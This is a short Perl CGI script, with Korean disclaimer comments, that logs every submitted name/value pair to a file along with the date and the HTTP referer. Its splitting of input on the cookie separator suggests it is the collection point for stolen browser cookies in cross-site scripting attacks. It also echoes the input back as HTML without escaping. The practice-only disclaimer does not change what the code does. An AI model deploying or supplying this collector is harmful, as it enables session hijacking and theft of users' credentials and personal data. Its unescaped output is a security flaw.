#!/usr/bin/perl

# 허가된 실습 폼에서 생성한 테스트 데이터에만 사용하세요.
# POST 내용 전체를 기록하므로 실제 자격 증명·개인정보가 유입되지 않도록 주의하세요.
# 무단 수집 및 오용에 따른 책임은 행위자에게 있습니다.

#Get Current Date
chomp($DATE=`date`);

#Log Directory
$dir="/var/www/logdir";

#Log File
$file="$dir/log.txt";

#Print HTML if tested from a browser
print "Content-type: text/html\n\n";

#Open Log File in appended mode
open(LOG,">>$file");

#Collect HTML Post Data
&getDATA;

#Close Log File
close(LOG);

sub getDATA
{
        # Put the posted data into variables
        if($ENV{'QUERY_STRING'} ne "")
        {
                $buffer=$ENV{'QUERY_STRING'};
        }
        elsif($ENV{'CONTENT_LENGTH'} ne "")
        {
                #Read the input stream using the below line
                read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
        }
        elsif($#ARGV > -1)
        {
                chomp($buffer=$ARGV[0]);
        }

        #print "buffer: $buffer<BR>\n";


        #Place buffer into the array @pairs, delimited by the ";%20"
        #A ";" plus "%20" equals a ";" and a space
        @pairs = split(/;%20/, $buffer);

        print "----------------------------------<BR>\n";
        print LOG "----------------------------------\n";

        $HTTP_REFERER = $ENV{'HTTP_REFERER'};
        print "HTTP_REFERER: $HTTP_REFERER<BR>\n";
        print LOG "HTTP_REFERER: $HTTP_REFERER\n";

        #Enumerate through the @pairs array
        foreach $pair (@pairs)
        {
                #splits each name/value pair on the equal sign delimiter
                ($name, $value) = split(/=/, $pair);

                #translates every "+" sign back to a space
                $value =~ tr/+/ /;

                #substitute every %HH hex pair back to its equivalent ASCII character, using the pack() function
                $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

                #store the values into a hash called %FORM
                $FORM{$name} = $value;

                print "DATE: $DATE; NAME: $name;VALUE: $value<BR>\n";
                print LOG "DATE: $DATE; NAME: $name; VALUE: $value\n";
        }

        print "----------------------------------<BR>\n";
        print LOG "----------------------------------\n";

}
